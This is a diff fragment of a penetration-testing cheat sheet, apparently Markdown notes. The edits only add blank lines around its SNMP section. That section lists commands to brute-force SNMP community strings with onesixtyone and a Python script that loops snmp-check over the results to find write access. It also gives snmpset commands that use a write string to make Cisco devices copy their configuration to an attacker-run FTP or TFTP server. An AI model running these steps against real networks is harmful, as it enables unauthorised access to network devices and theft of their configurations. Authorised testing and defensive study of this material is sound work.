@@ -90,11 +90,14 @@ References:
 
 ## UDP/161 SNMP
 - Run `onesixtyone` to guess some SNMP strings:
+
   ```
   wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -o snmp-strings.txt
   onesixtyone -c snmp-strings.txt -i hosts.txt -o onesixtyone-snmp-guess.txt
   ```
+
 - Parse `onesixtyone` results so it's `10.10.10.10 public` in a txt file, then run this py script to `snmp-check` all the things and check if any is RW access:
+
   ```
   #!/usr/bin/env python
   import os, sys
@@ -112,7 +115,9 @@ References:
       os.system(cmd2)
   file.close
   ```
+
 - Set up FTP server and FTP using a SNMP write string. Similar method for TFTP (which doesn't try to auth but could be blocked). Check the blog for TFTP instructions. Remember to have a 777 file in the TFTP root you're using.
+  
   ```
   # Install FTP server.
   # See https://www.ciscozine.com/how-to-save-configurations-using-snmp/
@@ -130,7 +135,9 @@ References:
   snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.14.1337 i 2
   snmpwalk -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
   ```
+
 - Do it over TFTP:
+
   ```
   # 336 is the ID, it lasts 5 minutes. You can clear it if needed.
   snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.2.336 i 1
